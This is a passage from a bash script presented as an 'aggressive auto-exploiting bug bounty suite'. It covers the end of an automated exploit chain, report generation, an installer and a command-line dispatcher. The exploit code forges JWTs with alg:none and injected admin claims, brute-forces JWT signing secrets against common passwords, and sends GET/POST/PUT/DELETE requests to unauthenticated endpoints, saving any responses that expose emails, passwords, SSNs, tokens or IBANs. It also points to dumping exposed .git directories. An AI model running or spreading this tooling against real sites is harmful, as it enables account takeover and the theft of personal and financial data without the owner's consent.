                if echo "$idx" | grep -q "DIRC"; then
                    uniq_add "$O/git_dumped.txt" "$base/.git (index readable — use git-dumper for full dump)"
                    did_anything=true
                fi
            fi
        done < "$V/tech/.git_exposed.txt"
    fi

    # 21.6 JWT attack
    if [[ -s "$V/jwt/jwt_tokens.txt" ]]; then
        log_hit "CHAIN 6: JWT tokens → weak-secret + alg:none"
        while IFS= read -r tok; do
            [[ -z "$tok" ]] && continue
            local hdr; hdr=$(echo "$tok" | cut -d. -f1 | base64 -d 2>/dev/null || true)
            echo "$hdr" | grep -qiE "RS256|ES256|PS256" && continue
            local forged; forged=$(python3 - "$tok" <<'PYEOF'
import base64, json, sys
t = sys.argv[1]
h, p, _ = t.split('.')
def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
try:
    hdr = json.loads(base64.urlsafe_b64decode(h + '=' * (-len(h) % 4)))
    pay = json.loads(base64.urlsafe_b64decode(p + '=' * (-len(p) % 4)))
except Exception:
    sys.exit(1)
hdr['alg'] = 'none'
pay['role'] = 'admin'; pay['is_admin'] = True; pay['admin'] = True
print(f"{b64(json.dumps(hdr).encode())}.{b64(json.dumps(pay).encode())}.")
PYEOF
)
            [[ -n "$forged" ]] && uniq_add "$O/jwt_alg_none.txt" "JWT_ALG_NONE: ${forged} (orig: $tok)"
            for secret in secret password 123456 admin jwt_secret changeme qwerty letmein 12345678; do
                local cand; cand=$(python3 - "$tok" "$secret" <<'PYEOF'
import base64, hashlib, hmac, sys
t, s = sys.argv[1], sys.argv[2]
h, p, sig = t.split('.')
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
for alg in ('HS256','HS384','HS512'):
    try:
        digest = hmac.new(s.encode(), f"{h}.{p}".encode(), getattr(hashlib, alg.lower())).digest()
        if b64(digest) == sig:
            print(alg); break
    except Exception: pass
PYEOF
)
                if [[ -n "$cand" ]]; then
                    uniq_add "$O/jwt_weak_secret.txt" "JWT_WEAK_SECRET [${cand}:${secret}]: $tok"
                    log_hit "JWT signed with weak secret: '$secret' ($cand)"
                    did_anything=true
                fi
            done
        done < "$V/jwt/jwt_tokens.txt"
    fi

    # 21.7 BAC — deep probe sensitive endpoints
    if [[ -s "$V/bac/bac_unauth.txt" ]]; then
        log_hit "CHAIN 7: BAC endpoints → deep probe for sensitive data"
        while IFS= read -r line; do
            local url; url=$(echo "$line" | grep -oP 'https?://\S+' | head -1)
            [[ -z "$url" ]] && continue
            for m in GET POST PUT DELETE; do
                local b; b=$(_curl -X "$m" --max-time 10 "$url" 2>/dev/null | head -c 2000 || true)
                echo "$b" | grep -qiE '"email"|"password"|"ssn"|"token"|"api[_-]?key"|"secret"|access[_-]?token|"salary"|"iban"' \
                    && { uniq_add "$O/bac_data.txt" "BAC_DATA [${m}]: $url"; echo "### $url [$m]" >> "$O/bac_data_dump.txt"; echo "$b" >> "$O/bac_data_dump.txt"; did_anything=true; }
            done
        done < "$V/bac/bac_unauth.txt"
    fi

    # Summary
    local n_findings=0
    for f in cmdi_rce lfi_reads ssrf_metadata takeover git_dumped jwt_weak_secret jwt_alg_none bac_data; do
        [[ -s "$O/$f.txt" ]] && n_findings=$(( n_findings + $(wc -l < "$O/$f.txt") ))
    done
    if [[ "$did_anything" == true ]]; then
        log_hit "EXPLOIT CHAIN COMPLETE — $n_findings exploitable findings → $O/"
    else
        log_ok "Exploit chain: no exploitable primitives found in this run"
    fi
}
# ── REPORT GENERATION ──────────────────────────────────────────────────
generate_report() {
    progress "Generating final report"
    local O="$WORKSPACE/report"
    mkdir -p "$O" 2>/dev/null || true
    local R="$O/bug_report.md"
    local V="$WORKSPACE/vulns"
    local t_findings=0

    {
        echo "# BUG FRAMEWORK v5.1 — Security Assessment Report"
        echo ""
        echo "- **Target:** ${DOMAIN:-N/A}"
        echo "- **Date:** $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
        echo "- **Workspace:** $WORKSPACE"
        echo ""
        echo "## 1. Scope & Assets"
        echo ""
        echo "- Subdomains discovered: $(cnt "$WORKSPACE/subdomains/final_subdomains.txt" 2>/dev/null || echo 0)"
        echo "- Live URLs: $(cnt "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null || echo 0)"
        echo "- Endpoints: $(cnt "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null || echo 0)"
        echo "- JS files: $(cnt "$WORKSPACE/js/js_urls.txt" 2>/dev/null || echo 0)"
        echo ""
        echo "## 2. Vulnerability Findings"
        echo ""

        local -a SECTIONS=(
            "sqli:SQL Injection"
            "xss:XSS (reflected/stored)"
            "cmdi:Command Injection"
            "lfi:LFI / Path Traversal"
            "ssrf:SSRF"
            "idor:IDOR"
            "bac:BAC / Missing Auth"
            "cors:CORS Misconfiguration"
            "csrf:CSRF"
            "oauth:OAuth Misconfiguration"
            "open_redirect:Open Redirect"
            "rce:RCE"
            "sub_takeover:Subdomain Takeover"
            "jwt:JWT Issues"
            "headers:Security Headers"
            "cve:CVE Matches"
        )
        local dir label file
        for entry in "${SECTIONS[@]}"; do
            dir="${entry%%:*}"; label="${entry##*:}"
            file="$V/$dir/$(ls "$V/$dir" 2>/dev/null | head -1)"
            local n=0
            for f in "$V/$dir/"*confirmed*.txt "$V/$dir/"*_rce*.txt "$V/$dir/"*_takeover*.txt "$V/$dir/"*_weak*.txt "$V/$dir/"*_data*.txt; do
                [[ -s "$f" ]] && n=$(( n + $(wc -l < "$f") ))
            done
            [[ "$n" -gt 0 ]] && { echo "### $label — **$n finding(s)**"; echo ""; t_findings=$(( t_findings + n )); }
        done

        echo "**Total findings: $t_findings**"
        echo ""
        echo "## 3. Raw Evidence"
        echo ""
        echo '```'
        for f in "$V"/*/*.txt; do
            [[ -s "$f" ]] && { echo "── $f ──"; cat "$f"; echo ""; }
        done
        echo '```'
        echo ""
        echo "## 4. Tech Stack"
        echo ""
        for f in "$WORKSPACE/tech/"*.txt; do
            [[ -s "$f" ]] && { echo "### $(basename "$f" .txt)"; echo '```'; cat "$f"; echo '```'; }
        done
        echo ""
        echo "*Report generated by BUG FRAMEWORK v5.1*"
    } > "$R"

    local n_total; n_total=$(grep -cE "^(### |\*\*Total)" "$R" 2>/dev/null || echo 0)
    log_ok "Report: $R ($t_findings findings)"
    log_hit "TOP FINDINGS (first 15 lines of each vuln file):"
    for f in "$V"/*/*.txt; do
        [[ -s "$f" ]] && { echo "  ▸ $f ($(wc -l < "$f") lines)"; head -5 "$f" | sed 's/^/      /'; }
    done 2>/dev/null | head -120
}

# ── USAGE ──────────────────────────────────────────────────────────────
usage() {
    cat <<'EOF'
BUG FRAMEWORK v5.1 — aggressive auto-exploiting bug bounty suite

USAGE:
  bug -d example.com                 Full automatic scan + exploitation
  bug -l targets.txt                 Scan list of domains
  bug -d example.com -js             JS-only deep mode (endpoints + secrets)
  bug -d example.com -we             Web-only mode (skip recon, reuse workspace)
  bug -d example.com -one            Single URL deep scan
  bug -d example.com -exploit        Re-run exploit chain on existing workspace
  bug -d example.com -report         Regenerate report only
  bug --install                      Install deps (macOS/Kali auto-detect)

ENV:
  INTERACTSH_DOMAIN=xxx.oast.pro      Enable OOB (blind RCE/SSRF) checks
  BUG_CONCURRENCY=20                  Override parallel jobs

OPTIONS:
  -q --quiet   minimal output      -v --verbose  full module logging
  -h --help    this help

REQUIRES: bash 5+, curl, jq, dig, nmap, ffuf, nuclei, gf, waybackurls,
  gau, subfinder, httpx, dnsx, naabu, katana, uro, unfurl, qsreplace,
  dalfox, sqlmap, git-dumper, interlace (see setup.sh)
EOF
}

# ── INSTALLER ──────────────────────────────────────────────────────────
do_install() {
    if [[ "$(uname -s)" == "Darwin" ]]; then
        log_ok "Detected macOS — install via: brew install bash coreutils gnu-grep jq ffuf nuclei gf waybackurls gau subfinder httpx dnsx naabu katana uro unfurl dalfox sqlmap; pip3 install git-dumper interlace"
        log_ok "Then ensure /opt/homebrew/bin/bash is the interpreter for this script."
        return 0
    fi
    if command -v apt-get >/dev/null 2>&1; then
        log_info "Installing packages (sudo)..."
        sudo apt-get update -qq
        sudo apt-get install -y -qq curl jq dnsutils whois nmap git python3 python3-pip \
            libpcap-dev build-essential golang-go >/dev/null 2>&1 || true
    fi
    export PATH="$PATH:$HOME/go/bin:$(go env GOPATH 2>/dev/null)/bin"
    log_info "Installing Go tools..."
    for tool in "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" \
                "github.com/projectdiscovery/httpx/cmd/httpx@latest" \
                "github.com/projectdiscovery/dnsx/cmd/dnsx@latest" \
                "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest" \
                "github.com/projectdiscovery/katana/cmd/katana@latest" \
                "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" \
                "github.com/tomnomnom/waybackurls@latest" \
                "github.com/lc/gau/v2/cmd/gau@latest" \
                "github.com/tomnomnom/gf@latest" \
                "github.com/tomnomnom/unfurl@latest" \
                "github.com/tomnomnom/qsreplace@latest" \
                "github.com/lc/uro@latest" \
                "github.com/hahwul/dalfox/v2@latest"; do
        go install "$tool" >/dev/null 2>&1 && log_ok "  ✓ $(basename "$tool" | sed 's/@.*//')" || log_warn "  ✗ $(basename "$tool" | sed 's/@.*//')"
    done
    command -v sqlmap >/dev/null 2>&1 || { log_info "Installing sqlmap..."; pip3 install --break-system-packages sqlmap >/dev/null 2>&1 || pip3 install sqlmap >/dev/null 2>&1 || true; }
    command -v git-dumper >/dev/null 2>&1 || { log_info "Installing git-dumper..."; pip3 install --break-system-packages git-dumper >/dev/null 2>&1 || pip3 install git-dumper >/dev/null 2>&1 || true; }
    [[ -d "$HOME/.gf" ]] || { gf -save >/dev/null 2>&1 || true; gf -list >/dev/null 2>&1 || true; }
    for pat in debug_logic idor sqli ssrf xss redirect rce; do
        [[ -f "$HOME/.gf/$pat.json" ]] || curl -s "https://raw.githubusercontent.com/1ndianl33t/Gf-Patterns/main/${pat}.json" -o "$HOME/.gf/${pat}.json" 2>/dev/null || true
    done
    mkdir -p /usr/share/wordlists 2>/dev/null || true
    for wl in "common.txt:https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt" \
              "raft-medium-directories.txt:https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt" \
              "subdomains-top1million-5000.txt:https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt" \
              "big.txt:https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt"; do
        local f="${wl%%:*}"; local u="${wl##*:}"
        [[ -f "/usr/share/wordlists/$f" ]] || sudo curl -s "$u" -o "/usr/share/wordlists/$f" 2>/dev/null && log_ok "  ✓ $f" || log_warn "  ✗ $f"
    done
    log_ok "Install complete. Run: bug -d example.com"
}

# ── MAIN ───────────────────────────────────────────────────────────────
main() {
    local mode="full"
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -d|--domain)    DOMAIN="${2:-}"; shift 2 ;;
            -l|--list)      LIST_FILE="${2:-}"; shift 2 ;;
            -js|--js-only)  mode="js"; shift ;;
            -we|--web)      mode="web"; shift ;;
            -one)           mode="one"; shift ;;
            -exploit)       mode="exploit"; shift ;;
            -report)        mode="report"; shift ;;
            --install)      do_install; exit 0 ;;
            -q|--quiet)     QUIET=true; shift ;;
            -v|--verbose)   VERBOSE=true; shift ;;
            -h|--help)      usage; exit 0 ;;
            *)              usage; exit 1 ;;
        esac
    done

    if [[ "$mode" == "report" ]]; then
        [[ -z "$DOMAIN" && -n "$LIST_FILE" ]] && DOMAIN=$(head -1 "$LIST_FILE")
        [[ -z "$DOMAIN" ]] && { echo "[-] No domain (use -d)"; usage; exit 1; }
        WORKSPACE="$BASE_WORKSPACE/$DOMAIN"
        [[ -n "$WORKSPACE" ]] || true
        generate_report; exit 0
    fi

    if [[ -n "$LIST_FILE" ]]; then
        [[ ! -s "$LIST_FILE" ]] && { echo "[-] List file empty: $LIST_FILE"; exit 1; }
        while IFS= read -r d; do
            [[ -z "$d" ]] && continue
            DOMAIN="$d"; WORKSPACE="$BASE_WORKSPACE/$DOMAIN"
            log_section "═══ TARGET: $DOMAIN ═══"
            run_full_scan
        done < "$LIST_FILE"
        exit 0
    fi

    [[ -z "$DOMAIN" ]] && { usage; exit 1; }
    WORKSPACE="$BASE_WORKSPACE/$DOMAIN"

    case "$mode" in
        full)    run_full_scan ;;
        js)      ensure_live; mod_js; log_ok "JS mode done — endpoints: $WORKSPACE/js/all_js_endpoints.txt" ;;
        web)     ensure_live; run_web_modules ;;
        one)     run_full_scan ;;
        exploit) [[ -d "$WORKSPACE" ]] || { echo "[-] No workspace for $DOMAIN — run full scan first"; exit 1; }
                 mod_exploit_chain; generate_report ;;
    esac
    log_ok "Done. Report: $WORKSPACE/report/bug_report.md"
}

BASE_WORKSPACE="${BASE_WORKSPACE:-$HOME/bug-bounty}"

# ── WEB MODULE DISPATCH (-we) ──
run_web_modules() {
    local m
    for m in mod_waf mod_api_schema mod_param_fuzz mod_paths mod_exposure mod_nuclei \
             mod_xss mod_sqli mod_ssrf mod_lfi mod_cmdi mod_csrf mod_cors mod_idor \
             mod_oauth mod_tech; do
        command -v "$m" >/dev/null 2>&1 && "$m" || true
    done
}

# ── FULL PIPELINE ORCHESTRATOR ──
run_full_scan() {
    setup_workspace
    mod_subdomains
    mod_httpx
    mod_urls
    mod_js
    mod_waf
    mod_api_schema
    mod_param_fuzz
    mod_paths
    mod_ports
    mod_exposure
    mod_nuclei
    mod_xss
    mod_sqli
    mod_ssrf
    mod_lfi
    mod_cmdi
    mod_csrf
    mod_cors
    mod_idor
    mod_oauth
    mod_tech
    mod_exploit_chain
    dedupe_workspace
    generate_report
}

# bootstrap
export PATH="$PATH:$HOME/go/bin:$(go env GOPATH 2>/dev/null)/bin"
main "$@"
